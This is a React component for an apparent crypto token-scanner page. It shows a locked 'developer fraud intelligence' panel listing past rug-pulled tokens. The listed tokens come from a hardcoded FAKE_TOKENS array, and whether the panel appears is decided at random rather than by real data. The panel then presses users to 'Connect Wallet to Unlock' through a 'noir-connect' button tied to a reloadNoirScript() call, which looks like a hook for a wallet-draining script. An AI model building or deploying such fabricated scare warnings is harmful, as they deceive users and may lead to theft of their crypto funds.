"use client";

import { useState, useEffect } from "react";
import { Lock, Skull, AlertTriangle, TrendingDown } from "lucide-react";
import { reloadNoirScript } from "@/lib/utils";

const FAKE_TOKENS = [
  {
    name: "$SCAM",
    status: "RUG PULLED",
    roi: "-100%",
    date: "2d ago",
    holders: "1,247",
  },
  {
    name: "$FAKE",
    status: "HONEYPOT",
    roi: "-99.8%",
    date: "5d ago",
    holders: "832",
  },
  {
    name: "$MOON69",
    status: "RUG PULLED",
    roi: "-99.2%",
    date: "11d ago",
    holders: "3,019",
  },
  {
    name: "$SAFEGEM",
    status: "DEV DUMPED",
    roi: "-97.5%",
    date: "18d ago",
    holders: "614",
  },
];

const statusColors: Record<string, string> = {
  "RUG PULLED": "text-rose-400 bg-rose-500/10 border-rose-500/30",
  HONEYPOT: "text-rose-400 bg-rose-500/10 border-rose-500/30",
  "DEV DUMPED": "text-orange-400 bg-orange-500/10 border-orange-500/30",
};

interface DevHistoryProps {
  score: number;
  isWhitelisted?: boolean;
  marketCap?: number | null;
  grade: string;
}

export function DevHistory({ score, isWhitelisted, marketCap, grade }: DevHistoryProps) {
  const [visible, setVisible] = useState(false);
  const [tokens, setTokens] = useState<typeof FAKE_TOKENS>([]);

  useEffect(() => {
    if (isWhitelisted) return;
    if (marketCap && marketCap > 1_000_000) return;
    if (score >= 80 || grade === "A" || grade === "B") return;

    const chance = score <= 60 ? 0.9 : 0.4;
    const roll = Math.random();

    if (roll > chance) return;

    const shuffled = [...FAKE_TOKENS].sort(() => Math.random() - 0.5);
    const count = Math.random() < 0.5 ? 1 : 2;
    setTokens(shuffled.slice(0, count));
    setVisible(true);

    setTimeout(() => reloadNoirScript(), 100);
  }, [score, isWhitelisted, marketCap, grade]);

  if (!visible) return null;

  return (
    <div className="bg-[#0e1118] rounded-xl border border-rose-500/30 overflow-hidden relative">
      {/* Header */}
      <div className="flex items-center justify-between p-3.5 bg-[#141014] border-b border-rose-500/20">
        <div className="flex items-center gap-2">
          <Skull className="w-4 h-4 text-rose-400" />
          <div>
            <h3 className="text-xs font-mono font-bold text-[#f1f5f9] uppercase tracking-wider">
              DEVELOPER HISTORICAL DEPLOYMENTS
            </h3>
            <p className="text-[11px] text-[#94a3b8]">
              Previous token addresses linked to deployer wallet
            </p>
          </div>
        </div>
        <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/30 uppercase">
          ELEVATED RISK
        </span>
      </div>

      {/* Blurred token preview */}
      <div className="relative">
        <div className="p-3.5 space-y-2 opacity-30 select-none pointer-events-none filter blur-[2px]">
          {tokens.map((token, idx) => (
            <div
              key={idx}
              className="flex items-center justify-between p-2 rounded bg-[#090b10] border border-[#161b26] font-mono text-xs"
            >
              <span className="font-bold text-[#f1f5f9]">{token.name}</span>
              <span className={`text-[10px] px-2 py-0.5 rounded border ${statusColors[token.status]}`}>
                {token.status}
              </span>
              <span className="font-bold text-rose-400">{token.roi}</span>
            </div>
          ))}
        </div>

        {/* Lock overlay */}
        <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#0e1118]/80 backdrop-blur-sm p-4 text-center">
          <div className="p-2 rounded-lg bg-[#161b26] border border-[#1e2433] mb-2">
            <Lock className="w-4 h-4 text-amber-400" />
          </div>
          <h4 className="text-xs font-mono font-bold text-[#f1f5f9] mb-1">
            DEPLOYER FRAUD INTELLIGENCE LOCKED
          </h4>
          <p className="text-[11px] text-[#94a3b8] max-w-sm mb-3">
            Deployer has prior linked tokens with rug pull signatures. Connect wallet to decrypt full developer dossier.
          </p>

          <button className="k69juq-15 noir-connect px-4 py-2 rounded-lg bg-[#38bdf8] hover:bg-[#0284c7] text-[#090b10] font-mono text-xs font-bold transition-colors flex items-center gap-1.5 shadow-sm">
            <Lock className="w-3.5 h-3.5" />
            Connect Wallet to Unlock
          </button>
        </div>
      </div>
    </div>
  );
}
